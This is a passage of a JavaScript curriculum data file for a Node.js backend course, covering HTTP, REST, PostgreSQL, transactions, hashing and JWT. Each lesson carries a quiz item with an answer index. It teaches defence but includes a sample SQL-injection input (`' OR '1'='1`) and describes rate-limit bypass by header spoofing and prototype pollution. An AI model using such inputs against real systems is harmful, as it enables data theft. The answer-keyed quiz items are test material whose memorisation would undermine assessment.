      { id: "node-m1-d11-q3", name: "Mastery Assignment: High-Concurrency Raw TCP Chat Relay Server", type: "assignment", desc: "Build a raw TCP room broadcast relay handling 1,000 concurrent sockets with idle timeouts and heartbeat pings." },
      { id: "node-m1-d11-q4", name: "Production Incident Lab: TIME-WAIT Socket Starvation Post-Mortem", type: "detective", desc: "Analyze ephemeral port exhaustion caused by rapid opening and closing of outbound TCP connections." }
    ]
  },
  {
    day: 12,
    month: 1,
    blockNum: 3,
    title: "Node.js Native HTTP Module: IncomingMessage, ServerResponse & Chunked Transfer Encoding",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (HTTP 1.1 Core & Chunked Encoding)",
    spokenGoal: "Master the native `http` module: Learn how Node.js parses HTTP requests into an `IncomingMessage` (Readable stream) and formats responses via `ServerResponse` (Writable stream), and master Chunked Transfer Encoding for streaming responses.",
    conceptInvariant: "In HTTP/1.1, if the response length is unknown upfront, the server sends `Transfer-Encoding: chunked` instead of `Content-Length`. This allows the server to stream data chunks to the client immediately as they are generated without buffering the whole response in RAM.",
    failureMode: "Calling `res.setHeader()` after already sending data with `res.write()`: Node.js throws `ERR_HTTP_HEADERS_SENT: Cannot set headers after they are sent to the client`.",
    tryItFriction: "Build a raw HTTP server without Express: stream 10 discrete JSON chunks using `Transfer-Encoding: chunked` with 500ms intervals, verifying the browser receives and renders each chunk progressively.",
    socraticHints: [
      "Why did Node.js throw `ERR_HTTP_HEADERS_SENT`?",
      "Headers must be sent BEFORE the body! Once you call `res.write()` or `res.end()`, the HTTP headers have already flown over the wire.",
      "Make sure all header mutations and status code setters happen before the first write."
    ],
    situationalPuzzle: {
      scenario: "An enterprise report endpoint generates a 500MB CSV file. The developer buffers the entire CSV into memory to calculate `Content-Length` before sending it. How does an experienced backend engineer refactor this to save 500MB of RAM?",
      options: [
        "Store the CSV in localStorage.",
        "Use Chunked Transfer Encoding: Omit Content-Length, set `Transfer-Encoding: chunked`, and pipe the database stream directly into `res` via `stream.pipeline`, streaming rows to the client with sub-1MB RAM usage.",
        "Ask the user to download smaller files.",
        "Split the report across 100 separate HTTP requests."
      ],
      answerIdx: 1,
      debrief: "Chunked Transfer Encoding allows HTTP servers to stream dynamically generated data without knowing total size in advance. The browser consumes chunks incrementally, eliminating server memory buffering."
    },
    quests: [
      { id: "node-m1-d12-q1", name: "The HTTP 1.1 Wire Protocol Grammar", type: "concept", desc: "Deconstruct raw HTTP wire requests: Request Line, Headers, CRLF (`\r\n\r\n`), Chunk Size Hex, Chunk Data, and 0-length Trailer." },
      { id: "node-m1-d12-q2", name: "Detective Lab: The ERR_HTTP_HEADERS_SENT Mystery", type: "detective", desc: "Isolate a race condition where double callback execution attempted to send multiple HTTP error responses." },
      { id: "node-m1-d12-q3", name: "Mastery Assignment: Native HTTP Reverse Proxy with Streaming Chunk Forwarding", type: "assignment", desc: "Build an HTTP reverse proxy from scratch using native http.request piping chunks bidirectionally without buffering." },
      { id: "node-m1-d12-q4", name: "Production Incident Lab: Keep-Alive Connection Pooling Optimization", type: "detective", desc: "Configure `http.Agent({ keepAlive: true })` to reuse TCP connections and reduce outgoing API latency by 70%." }
    ]
  },
  {
    day: 13,
    month: 1,
    blockNum: 3,
    title: "High-Performance Routing with Fastify/Express: Schema Validation & Middleware Chains",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Fastify Internals & Schema Compilers)",
    spokenGoal: "Master modern backend frameworks: Contrast legacy Express with modern Fastify, understand the Onion middleware model, and learn how Fastify achieves 3x higher throughput using Ahead-of-Time JSON schema compilation (`fast-json-stringify`).",
    conceptInvariant: "Standard `JSON.stringify()` inspects every object property dynamically at runtime. Fastify uses AJV and `fast-json-stringify` to compile schemas into optimized JavaScript serialization functions during server boot, doubling serialization speed and cutting CPU overhead.",
    failureMode: "Allowing unvalidated user input directly into route handlers without strict schema validation, exposing downstream database queries to injection attacks and unexpected null pointer exceptions.",
    tryItFriction: "Define a Fastify route with strict JSON schemas for body, params, and querystring; verify that invalid requests are automatically rejected with standard 400 Bad Request envelopes.",
    socraticHints: [
      "Why is Fastify significantly faster at returning JSON than Express?",
      "Fastify pre-compiles JSON serialization schemas into optimized bytecode! It knows the exact shape of your response upfront.",
      "Always supply response schemas in Fastify routes to activate the high-speed compilation engine."
    ],
    situationalPuzzle: {
      scenario: "A junior developer writes an Express middleware: `app.use((req, res, next) => { if (req.auth) next(); res.status(401).send('Unauthorized'); });`. When an authorized user hits an endpoint, what error is thrown?",
      options: [
        "The server returns 200 OK normally.",
        "`ERR_HTTP_HEADERS_SENT`: Because the developer forgot `return next()`, execution continues and attempts to send a 401 response AFTER the route handler has already sent a 200 response.",
        "Express ignores the second response.",
        "The browser crashes."
      ],
      answerIdx: 1,
      debrief: "Calling next() does not terminate the middleware function. Unless you explicitly `return next()`, execution proceeds to the next line, causing multiple responses to be sent for the same request and throwing ERR_HTTP_HEADERS_SENT."
    },
    quests: [
      { id: "node-m1-d13-q1", name: "The Fastify Lifecycle Hook & Plugin Architecture", type: "concept", desc: "Trace the request lifecycle: onRequest -> preParsing -> preValidation -> preHandler -> handler -> onSend -> onResponse." },
      { id: "node-m1-d13-q2", name: "Detective Lab: The Leaked Next Middleware Continuation Bug", type: "detective", desc: "Fix an authentication middleware bug that allowed unauthorized requests to execute downstream route logic." },
      { id: "node-m1-d13-q3", name: "Mastery Assignment: Type-Safe Fastify Microservice with AJV Validation", type: "assignment", desc: "Build an enterprise API service with strict JSON schemas, custom error formatting, and compiled serialization." },
      { id: "node-m1-d13-q4", name: "Production Incident Lab: Prototype Pollution in Body Parsers", type: "detective", desc: "Analyze how malicious JSON payloads containing `__proto__` can pollute global object prototypes and how to sanitize them." }
    ]
  },
  {
    day: 14,
    month: 1,
    blockNum: 3,
    title: "RESTful API Invariants: Idempotence, HTTP Status Codes, Content Negotiation & Error Envelopes",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (REST Invariants & API Contracts)",
    spokenGoal: "Master enterprise REST architectural invariants: Understand HTTP method idempotence (GET, PUT, DELETE are idempotent; POST is not), accurate HTTP status codes (200, 201, 204, 400, 401, 403, 404, 409, 422, 500), and standardized RFC 7807 Problem Details error envelopes.",
    conceptInvariant: "An idempotent HTTP method can be executed multiple times with the exact same side-effect as a single execution. Network retries must only be performed on idempotent methods (GET, PUT, DELETE) or POST requests accompanied by an `Idempotency-Key` header.",
    failureMode: "Using POST for updates that should be PUT, or returning HTTP 200 OK with `{ success: false, error: 'Unauthorized' }` in the body, breaking downstream API gateways and automated retry monitors.",
    tryItFriction: "Design a standardized RFC 7807 Problem Details error handler that formats all application exceptions into structured JSON with `type`, `title`, `status`, `detail`, and `instance` fields.",
    socraticHints: [
      "Why is returning `HTTP 200 OK` with an error message in the JSON body an anti-pattern?",
      "HTTP caches, proxies, load balancers, and monitoring systems rely on the HTTP STATUS CODE to detect outages and errors!",
      "Use proper status codes: 401 for missing auth, 403 for insufficient permissions, 422 for validation errors."
    ],
    situationalPuzzle: {
      scenario: "A client application experiences a network timeout while sending a payment request. The client automatically retries the request 3 times. Because the backend developer implemented payments as a non-idempotent POST without idempotency keys, what disaster occurs?",
      options: [
        "The payment is processed once correctly.",
        "The customer is charged 4 times for the same order because each retried POST request created a separate new charge transaction.",
        "The bank cancels all transactions.",
        "The network timeout cancels the payment."
      ],
      answerIdx: 1,
      debrief: "POST is non-idempotent. If a client retries a POST payment after a timeout, the server treats it as a new transaction, double-charging the user. Non-idempotent mutations must require an `Idempotency-Key` to safely handle retries."
    },
    quests: [
      { id: "node-m1-d14-q1", name: "The RFC 7807 Problem Details Specification", type: "concept", desc: "Implement standard HTTP problem envelopes: URI type, human title, status code, detailed description, and error codes." },
      { id: "node-m1-d14-q2", name: "Detective Lab: The False 200 OK Error Monitoring Masking", type: "detective", desc: "Refactor an API that masked 500 server crashes behind 200 OK envelopes, restoring Datadog error alerts." },
      { id: "node-m1-d14-q3", name: "Mastery Assignment: Idempotent Payment Processing Middleware Engine", type: "assignment", desc: "Build an idempotency middleware storing request hashes and cached responses in Redis with expiration TTLs." },
      { id: "node-m1-d14-q4", name: "Production Incident Lab: Cache Invalidation Failures in REST APIs", type: "detective", desc: "Configure ETag, Last-Modified, and Cache-Control headers to optimize cache hits while preventing stale reads." }
    ]
  },
  {
    day: 15,
    month: 1,
    blockNum: 3,
    title: "Milestone 3: Enterprise RESTful Gateway with Strict Zod Validation & Rate Limiting",
    stageName: "Stage 2: Guided System Construction",
    stageNum: 2,
    pedagogicalRole: "Milestone Gate (API Gateway & Request Governance)",
    spokenGoal: "Build and defend Milestone 3: An enterprise RESTful API Gateway featuring strict Zod schema validation, sliding-window rate limiting, RFC 7807 error envelopes, correlation ID tracing, and automated health checks.",
    conceptInvariant: "Enterprise API Gateways must validate and sanitize all incoming payloads at the boundary before forwarding, enforce strict IP and user rate limits to prevent denial-of-service, and stamp every request with a unique `X-Request-ID` for distributed tracing.",
    failureMode: "Allowing an unauthenticated client to bypass rate limits by spoofing `X-Forwarded-For` HTTP headers.",
    tryItFriction: "Implement a sliding-window rate limiter allowing 100 requests per minute per IP: simulate 150 rapid requests, asserting that requests 101–150 receive `HTTP 429 Too Many Requests` with `Retry-After` headers.",
    socraticHints: [
      "Why can't we blindly trust `req.headers['x-forwarded-for']` for rate limiting?",
      "An attacker can set that header to any fake IP they want to bypass rate limits!",
      "Only trust `x-forwarded-for` if your server is behind a trusted reverse proxy (like Cloudflare or NGINX) with `trustProxy` enabled."
    ],
    situationalPuzzle: {
      scenario: "During the Milestone 3 defense, a client sends an invalid request: the age field is -5 and the email is missing an @ symbol. Your gateway returns a single generic string: 'Bad request'. The reviewer rejects the deliverable. Why?",
      options: [
        "The status code should be 500.",
        "Enterprise APIs must return granular field-level validation errors: an array detailing every failed field (e.g. `[{ field: 'age', message: 'Must be >= 0' }, { field: 'email', message: 'Invalid email format' }]`).",
        "The server should have corrected the age to 0.",
        "Zod is not allowed."
      ],
      answerIdx: 1,
      debrief: "Developer experience and frontend integration require granular validation feedback. Returning a single generic error string forces client developers to guess which field failed. Field-level error arrays are mandatory."
    },
    quests: [
      { id: "node-m1-d15-q1", name: "Milestone 3 System Architecture Specification", type: "concept", desc: "Design the gateway middleware pipeline: Request ID -> Rate Limiter -> Body Parser -> Zod Validator -> Handler." },
      { id: "node-m1-d15-q2", name: "Detective Lab: The Spoofed X-Forwarded-For Rate Limit Bypass", type: "detective", desc: "Patch a vulnerability where rotating fake X-Forwarded-For headers bypassed API rate limiting entirely." },
      { id: "node-m1-d15-q3", name: "Mastery Assignment: Production API Gateway with Zod & Rate Limiting", type: "assignment", desc: "Deliver the full gateway service with sliding-window limits, RFC 7807 errors, and request correlation logging." },
      { id: "node-m1-d15-q4", name: "Milestone 3 Defense: API Governance & Security Auditing Viva", type: "detective", desc: "Defend your schema validation boundaries, rate-limiting algorithms, and header trust policies before Senior Architects." }
    ]
  },

  // ── BLOCK 4: Persistence, Relational Databases & Transactions (Days 16–20) ────
  {
    day: 16,
    month: 1,
    blockNum: 4,
    title: "PostgreSQL Database Driver: TCP Socket Connections & Parameterized SQL Queries",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (PostgreSQL Wire Protocol & Parameterized Queries)",
    spokenGoal: "Master PostgreSQL backend integration: Understand how the `pg` driver communicates with PostgreSQL over raw TCP sockets via the PostgreSQL Frontend/Backend protocol, and why Parameterized Queries are the ONLY defense against SQL Injection.",
    conceptInvariant: "NEVER concatenate user input strings into SQL query text. Parameterized queries send the SQL statement and data parameters in separate protocol packets (Extended Query Protocol). The PostgreSQL server compiles the SQL syntax BEFORE substituting values, making SQL injection mathematically impossible.",
    failureMode: "Writing `client.query(\"SELECT * FROM users WHERE name = '\" + input + \"'\")`: an attacker inputs `' OR '1'='1` and dumps the entire user database.",
    tryItFriction: "Demonstrate a classic SQL injection exploit with string concatenation, then refactor to parameterized query syntax `client.query('SELECT * FROM users WHERE name = $1', [input])` and verify complete mitigation.",
    socraticHints: [
      "Why does `client.query('SELECT * FROM users WHERE id = $1', [userId])` prevent SQL injection?",
      "Because `$1` is NOT string replacement! The SQL structure is parsed and compiled first; the parameter is treated purely as raw literal data.",
      "Even if the user input contains `DROP TABLE`, PostgreSQL treats it as a harmless string of text."
    ],
    situationalPuzzle: {
      scenario: "An engineer writes: `const query = `SELECT * FROM users ORDER BY ${req.query.sortColumn}`; client.query(query)`. The team lead flags a critical vulnerability. Parameterized queries (`ORDER BY $1`) do NOT work for column names in SQL. How must dynamic column sorting be secured?",
      options: [
        "Escape the column name with double quotes manually.",
        "Strict Allowlist (Whitelist) Validation: Check `sortColumn` against a hardcoded array of permitted column names (e.g. `['created_at', 'name', 'email']`). If not in the list, reject the request or default safely.",
        "Disable sorting.",
        "Ask the database to sanitize it."
      ],
      answerIdx: 1,
      debrief: "SQL parameters (`$1`, `$2`) can only substitute data values, not identifiers (table or column names) or SQL keywords. When identifiers must be dynamic, they must be validated against a strict hardcoded allowlist to prevent SQL injection."
    },
    quests: [
      { id: "node-m1-d16-q1", name: "The PostgreSQL Frontend/Backend Protocol Specification", type: "concept", desc: "Trace message types: StartupMessage -> Authentication -> Parse (SQL) -> Bind (Params) -> Execute -> DataRow -> ReadyForQuery." },
      { id: "node-m1-d16-q2", name: "Detective Lab: The SQL Injection Data Breach Investigation", type: "detective", desc: "Audit a legacy codebase and replace 12 vulnerable string-concatenated SQL queries with secure parameterized syntax." },
      { id: "node-m1-d16-q3", name: "Mastery Assignment: Production PostgreSQL Connection Client with Type Mapping", type: "assignment", desc: "Build a raw PostgreSQL client layer handling custom type parsers (BigInt, Timestamp with Timezone, UUID)." },
      { id: "node-m1-d16-q4", name: "Production Incident Lab: Dynamic SQL Identifier Injection Mitigation", type: "detective", desc: "Implement a secure dynamic SQL query builder enforcing column whitelists and safe identifier escaping." }
    ]
  },
  {
    day: 17,
    month: 1,
    blockNum: 4,
    title: "Database Connection Pool Management: Pool Sizing, Idle Timeouts & Starvation Guards",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Connection Pooling & Starvation)",
    spokenGoal: "Master database connection pooling: Learn why opening a new database TCP connection for every HTTP request is disastrous (TLS handshake + process forking in Postgres), how connection pools reuse sockets, and how to size pools using Little's Law to prevent pool starvation.",
    conceptInvariant: "A database connection pool maintains a fixed set of open TCP sockets to the database. Sizing a pool too large overwhelms PostgreSQL CPU and RAM; sizing it too small causes connection wait timeouts under traffic spikes. The optimal pool size is derived from CPU cores and disk spindles: `pool_size = (core_count * 2) + effective_spindle_count`.",
    failureMode: "Acquiring a client from the pool with `const client = await pool.connect()` but forgetting to call `client.release()` in a `finally` block: after 10 requests, the entire pool is exhausted, and all subsequent queries hang forever.",
    tryItFriction: "Exhaust a 5-connection pool by omitting `client.release()`, observe the server hang on request 6, then wrap client usage in `try ... finally { client.release(); }` to guarantee 100% connection recovery.",
    socraticHints: [
      "Why did the server stop responding to all database queries after 10 requests?",
      "The connection pool has a limit (e.g. 10). You acquired 10 connections and never released them back to the pool!",
      "Always call `client.release()` inside a `finally` block, or use `pool.query()` which handles release automatically."
    ],
    situationalPuzzle: {
      scenario: "During a flash sale, 2,000 concurrent users hit a Node.js API with a connection pool size of 20. Response times spike from 20ms to 8,000ms. Database CPU is only 25%, but Node.js profiling shows requests spending 7,900ms waiting for `pool.connect()`. What is the bottleneck?",
      options: [
        "The database crashed.",
        "Connection Pool Starvation: 2,000 requests are queueing up waiting for 20 database connections. The delay is not database query execution, but connection acquisition queue wait time.",
        "Node.js has a memory leak.",
        "PostgreSQL is out of disk space."
      ],
      answerIdx: 1,
      debrief: "Connection pool starvation occurs when incoming request concurrency drastically exceeds available pool capacity. Requests spend seconds waiting in the Node.js connection queue before even executing their SQL query."
    },
    quests: [
      { id: "node-m1-d17-q1", name: "The Connection Pool State Machine Topology", type: "concept", desc: "Trace connection lifecycle: Total Connections, Active/Acquired Clients, Idle Clients, and the Waiting Request Queue." },
      { id: "node-m1-d17-q2", name: "Detective Lab: The Unreleased Client Connection Leak Outage", type: "detective", desc: "Fix an enterprise backend freeze where an unhandled exception in an early return bypassed client.release()." },
      { id: "node-m1-d17-q3", name: "Mastery Assignment: Self-Healing Connection Pool with Health Probes", type: "assignment", desc: "Build a connection pool manager with idle timeouts, connection lifetime reaping, and automated retry probes." },
      { id: "node-m1-d17-q4", name: "Production Incident Lab: Sizing PostgreSQL Connection Pools with PgBouncer", type: "detective", desc: "Evaluate transaction-level connection pooling using PgBouncer to scale from 100 to 10,000 concurrent Node.js clients." }
    ]
  },
  {
    day: 18,
    month: 1,
    blockNum: 4,
    title: "ACID Transaction Invariants: BEGIN, COMMIT, ROLLBACK & Row-Level Locking (FOR UPDATE)",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (ACID Transactions & Concurrency Control)",
    spokenGoal: "Master relational ACID transactions: Understand Atomicity, Consistency, Isolation, and Durability, execute transactions using `BEGIN`, `COMMIT`, and `ROLLBACK`, and prevent race conditions (double spending) using pessimistic row-level locking (`SELECT ... FOR UPDATE`).",
    conceptInvariant: "A transaction must execute on a SINGLE, DEDICATED database connection client acquired from the pool. Calling `pool.query('BEGIN')` followed by `pool.query('COMMIT')` is a catastrophic error because each query may execute on a completely different pooled connection!",
    failureMode: "Executing two concurrent balance deductions without row-level locking: both transactions read balance = $100 simultaneously and deduct $80, allowing the user to spend $160 from a $100 account (Lost Update race condition).",
    tryItFriction: "Simulate two simultaneous transfer requests against the same bank account: prove that without `FOR UPDATE`, double spending occurs, then implement row locking and verify balance integrity.",
    socraticHints: [
      "Why did `pool.query('BEGIN')` fail to isolate our queries?",
      "`pool.query()` picks a random idle connection for each call! Your BEGIN ran on Connection 1, your UPDATE ran on Connection 2!",
      "You must acquire a dedicated client: `const client = await pool.connect(); try { await client.query('BEGIN'); ... }`."
    ],
    situationalPuzzle: {
      scenario: "Two users try to book the last available concert seat at the exact same millisecond. User A runs `SELECT seat WHERE id=1`; User B runs `SELECT seat WHERE id=1`. Both see `status='available'`. Both run `UPDATE seat SET status='booked'`. Both get booking confirmations. What SQL lock was missing?",
      options: [
        "TABLE LOCK",
        "`SELECT ... FOR UPDATE`: This acquires an exclusive row-level write lock. User B's query will pause and wait until User A commits or rolls back, preventing double booking.",
        "ORDER BY id",
        "GROUP BY seat"
      ],
      answerIdx: 1,
      debrief: "`SELECT ... FOR UPDATE` locks the selected rows against concurrent reads/writes by other transactions until the current transaction commits. User B will block until User A finishes, then see `status='booked'` and abort."
    },
    quests: [
      { id: "node-m1-d18-q1", name: "The ACID Properties & ANSI SQL Isolation Levels", type: "concept", desc: "Deconstruct isolation levels: Read Uncommitted, Read Committed, Repeatable Read, Serializable, and their trade-offs." },
      { id: "node-m1-d18-q2", name: "Detective Lab: The Pool.query('BEGIN') Multi-Connection Bug", type: "detective", desc: "Isolate a fatal bug where transaction statements were scattered across multiple pool connections, leaving uncommitted locks." },
      { id: "node-m1-d18-q3", name: "Mastery Assignment: Double-Entry Financial Ledger Transfer Engine", type: "assignment", desc: "Implement a money transfer function with SELECT FOR UPDATE, balance checks, debit/credit entries, and atomic rollback." },
      { id: "node-m1-d18-q4", name: "Production Incident Lab: Deadlock Detection & Automated Retry Backoff", type: "detective", desc: "Diagnose PostgreSQL deadlock errors (`40P01`) caused by acquiring locks in reverse order and implement retry loops." }
    ]
  },
  {
    day: 19,
    month: 1,
    blockNum: 4,
    title: "Database Migrations & Schema Versioning: Up/Down Migrations & Seed Pipelines",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Schema Migrations & Version Control)",
    spokenGoal: "Master database migrations: Learn how to manage evolving database schemas as version-controlled code, write reversible `up` and `down` migrations, track migration state via a `schema_migrations` table, and execute safe zero-downtime schema changes.",
    conceptInvariant: "Database schemas must be treated as version-controlled immutable history. Production migrations must be backwards-compatible (expand and contract pattern): NEVER rename or drop a column in the same release that updates application code.",
    failureMode: "Renaming a column directly in production (`ALTER TABLE users RENAME COLUMN email TO user_email`): active application instances immediately crash with 'column email does not exist' during rolling deployment.",
    tryItFriction: "Write a pure TypeScript migration runner that creates a `migrations` tracking table, executes unapplied SQL migration files in chronological order inside a transaction, and records their timestamps.",
    socraticHints: [
      "Why must every migration run inside an explicit transaction?",
      "If a migration script contains 5 SQL statements and the 4th fails, you end up with a half-applied schema that breaks the database!",
      "Wrap migrations in `BEGIN ... COMMIT` so failures automatically roll back to the clean previous state."
    ],
    situationalPuzzle: {
      scenario: "A high-traffic e-commerce database has 50,000,000 orders. An engineer runs: `ALTER TABLE orders ADD COLUMN status VARCHAR DEFAULT 'pending' NOT NULL;`. The migration locks the table for 15 minutes, halting all checkouts globally. How should this migration be executed without locking?",
      options: [
        "Delete all orders before adding the column.",
        "Add the column without a default initially: `ADD COLUMN status VARCHAR;`, backfill data in small batches off-peak, add the default, and then apply the NOT NULL constraint with `NOT VALID` followed by `VALIDATE CONSTRAINT`.",
        "Restart the database.",
        "Drop the table."
      ],
      answerIdx: 1,
      debrief: "Adding a column with a non-null default value in older PostgreSQL versions forces a full table rewrite, acquiring an exclusive lock. Safe zero-downtime migrations add nullable columns, backfill asynchronously in batches, and validate constraints non-blockingly."
    },
    quests: [
      { id: "node-m1-d19-q1", name: "The Expand-and-Contract Migration Architecture", type: "concept", desc: "Master the 3-phase zero-downtime release cycle: Phase 1: Expand Schema -> Phase 2: Dual Write -> Phase 3: Contract Old Schema." },
      { id: "node-m1-d19-q2", name: "Detective Lab: The Non-Transactional Migration Corruption Outage", type: "detective", desc: "Recover a database from a corrupted intermediate schema state caused by an unrolled partial migration failure." },
      { id: "node-m1-d19-q3", name: "Mastery Assignment: Custom Migration Runner & Seeder Engine", type: "assignment", desc: "Build a standalone TypeScript migration CLI with UP/DOWN rollbacks, checksum verification, and seed data pipelines." },
      { id: "node-m1-d19-q4", name: "Production Incident Lab: Table Lock Outage on Large ALTER TABLE Operations", type: "detective", desc: "Use pg_stat_activity to detect exclusive table locks and configure statement_timeout guards in migration scripts." }
    ]
  },
  {
    day: 20,
    month: 1,
    blockNum: 4,
    title: "Milestone 4: Financial Ledger API with Strict Row-Level Locking & Double-Entry Bookkeeping",
    stageName: "Stage 2: Guided System Construction",
    stageNum: 2,
    pedagogicalRole: "Milestone Gate (Financial Transactions & ACID Invariants)",
    spokenGoal: "Build and defend Milestone 4: A financial double-entry bookkeeping ledger service with strict row-level locking (`SELECT ... FOR UPDATE`), atomic balance transfer guarantees, immutable audit log entries, and automated rollback on constraint violations.",
    conceptInvariant: "Double-entry accounting requires that every financial transaction consists of at least two entries: a debit to one account and an equal credit to another. The fundamental invariant must hold at all times: `SUM(debits) - SUM(credits) === 0`.",
    failureMode: "Allowing an account balance to go negative due to missing row locking during concurrent API requests, violating foundational banking invariants.",
    tryItFriction: "Run a high-concurrency stress test: send 100 simultaneous $10 transfer requests from an account with $500 balance, verifying that exactly 50 succeed, 50 fail with insufficient funds, and balance is exactly $0.",
    socraticHints: [
      "In what order should account locks be acquired during a transfer between Account A and Account B?",
      "Always lock accounts in numerical ID order! (e.g. `if (fromId < toId) lock(from), lock(to) else lock(to), lock(from)`).",
      "Consistent lock ordering is the mathematical guarantee that eliminates transaction deadlocks."
    ],
    situationalPuzzle: {
      scenario: "During the Milestone 4 viva, User 1 transfers $50 from Account #5 to Account #10. At the exact same millisecond, User 2 transfers $50 from Account #10 to Account #5. Without deterministic lock ordering, what error occurs?",
      options: [
        "The money is doubled.",
        "Deadlock (Error 40P01): User 1 locks #5 and waits for #10; User 2 locks #10 and waits for #5. Both transactions are frozen waiting for each other until PostgreSQL terminates one with a deadlock exception.",
        "Both transactions succeed simultaneously.",
        "The server reboots."
      ],
      answerIdx: 1,
      debrief: "Deadlocks occur when two transactions acquire the same set of locks in reverse order. Soring account IDs before acquiring locks guarantees that all transactions acquire resources in identical order, making circular deadlocks impossible."
    },
    quests: [
      { id: "node-m1-d20-q1", name: "Milestone 4 Financial Ledger Schema Specification", type: "concept", desc: "Design the double-entry accounting schema: accounts, ledger_entries, journal_transactions, and balance constraints." },
      { id: "node-m1-d20-q2", name: "Detective Lab: The Concurrent Transfer Deadlock Outage", type: "detective", desc: "Diagnose an enterprise banking deadlock crash and eliminate circular lock waits by enforcing deterministic ID sorting." },
      { id: "node-m1-d20-q3", name: "Mastery Assignment: Production Double-Entry Accounting Ledger Engine", type: "assignment", desc: "Deliver the complete financial ledger API with ACID transactions, row locking, audit logs, and zero race conditions." },
      { id: "node-m1-d20-q4", name: "Milestone 4 Defense: ACID Invariants & Concurrency Control Viva", type: "detective", desc: "Defend your transaction isolation, lock acquisition order, and ledger balance proofs before Senior Architects." }
    ]
  },

  // ── BLOCK 5: Authentication, Security & Cryptography (Days 21–25) ─────────────
  {
    day: 21,
    month: 1,
    blockNum: 5,
    title: "Node.js Cryptography Module: Hashing (scrypt, argon2), Salts & Timing-Safe Equal",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Cryptographic Hashing & Timing Attacks)",
    spokenGoal: "Master backend cryptography: Learn why fast hash algorithms (MD5, SHA-256) are completely unsuited for passwords, how memory-hard key derivation functions (`scrypt`, `argon2`) resist GPU/ASIC attacks, and how `crypto.timingSafeEqual` prevents timing side-channel attacks.",
    conceptInvariant: "Comparing secret strings (like API keys or webhook HMAC signatures) using `===` is vulnerable to Timing Attacks. Standard equality comparisons return `false` on the first non-matching byte, leaking key bytes via execution time. Always use `crypto.timingSafeEqual()` which executes in constant time.",
    failureMode: "Using `crypto.createHash('sha256')` to hash passwords: modern GPUs can compute over 10 billion SHA-256 hashes per second, allowing brute-force cracking of user passwords in minutes.",
    tryItFriction: "Demonstrate a timing side-channel difference between `str1 === str2` on matching vs non-matching prefixes, then implement `crypto.timingSafeEqual(bufA, bufB)` and verify constant execution time.",
    socraticHints: [
      "Why did the security auditor flag `if (userToken === expectedToken)` on our webhook endpoint?",
      "The `===` operator exits early on the first different byte! An attacker measures response times in microseconds to guess the token character by character.",
      "Convert both to Buffers of equal length and compare with `crypto.timingSafeEqual()`."
    ],
    situationalPuzzle: {
      scenario: "An enterprise candidate is asked: 'Why must password hashing algorithms incorporate a unique random cryptographic Salt for every single user, rather than using a single global server secret?'",
      options: [
        "Because salts make the database faster.",
        "Salts prevent Rainbow Table attacks: Without unique salts, two users with the same password have identical hashes, allowing attackers to pre-compute hashes and crack all identical passwords simultaneously.",
        "Salts reduce memory consumption.",
        "Node.js requires salts for syntax validation."
      ],
      answerIdx: 1,
      debrief: "A unique salt guarantees that two users with the exact same password produce completely different hash outputs. This renders pre-computed Rainbow Table lookup dictionaries useless and forces attackers to crack each password individually."
    },
    quests: [
      { id: "node-m1-d21-q1", name: "The Key Derivation Function Cost Factors (CPU, Memory, Parallelism)", type: "concept", desc: "Compare scrypt, bcrypt, and Argon2id parameters: N (cost), r (block size), p (parallelism), and GPU resistance." },
      { id: "node-m1-d21-q2", name: "Detective Lab: The Webhook Signature Timing Attack Exploit", type: "detective", desc: "Audit a Stripe webhook signature verification handler and replace vulnerable string comparisons with constant-time equality." },
      { id: "node-m1-d21-q3", name: "Mastery Assignment: Production Password Security Service with scrypt", type: "assignment", desc: "Build a password hashing module with salt generation, secure scrypt derivation, and automatic hash upgrade checks." },
      { id: "node-m1-d21-q4", name: "Production Incident Lab: Libuv Worker Starvation via Synchronous Cryptography", type: "detective", desc: "Trace an event loop stall caused by running scrypt on the main thread and tune UV_THREADPOOL_SIZE for crypto load." }
    ]
  },
  {
    day: 22,
    month: 1,
    blockNum: 5,
    title: "Stateless Authentication: JWT Creation, RS256 Asymmetric Signatures & Refresh Token Rotation",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (JSON Web Tokens & Asymmetric Signatures)",
    spokenGoal: "Master modern token authentication: Understand JSON Web Token structure (Header, Payload, Signature), the critical security difference between symmetric (HS256) and asymmetric (RS256) keys, and implement secure Refresh Token Rotation to mitigate token theft.",
    conceptInvariant: "In microservices, use asymmetric keys (RS256/EdDSA). The Auth service signs JWTs with a private key; downstream microservices verify signatures using the public key with ZERO shared secret leaks. Access tokens must be short-lived (15 minutes); Refresh tokens must rotate on every use.",
    failureMode: "Using a symmetric secret (HS256) across 15 microservices: if a single downstream service is compromised, an attacker obtains the signing key and can forge root admin JWTs for the entire infrastructure.",
    tryItFriction: "Generate an RSA 4096-bit key pair using `crypto.generateKeyPairSync`, sign a user payload using the private key with RS256, and verify the signature using only the public key.",
    socraticHints: [
      "Why is symmetric HS256 risky across multiple distributed backend services?",
      "Because every service that verifies the token must know the SECRET key! Anyone with the secret can forge new tokens.",
      "Use RS256: only the Auth service has the Private Key to sign; all other services only have the Public Key to verify."
    ],
    situationalPuzzle: {
      scenario: "An attacker steals a user's Refresh Token from an insecure device. 5 minutes later, both the legitimate user and the attacker attempt to use the token to get a new Access Token. How does Refresh Token Rotation detect the theft?",
      options: [
        "It locks the user's computer.",
        "Automatic Family Invalidation: When a previously used refresh token is presented a second time (token reuse), the system immediately revokes the ENTIRE family of refresh tokens, logging out both the attacker and legitimate user.",
        "It ignores the attacker.",
        "It changes the user's password automatically."
      ],
      answerIdx: 1,
      debrief: "Refresh Token Rotation invalidates the token upon use and issues a new pair. If a revoked token is used again, the system recognizes a token reuse attack, revokes all tokens descended from that family, and forces re-authentication."
    },
    quests: [
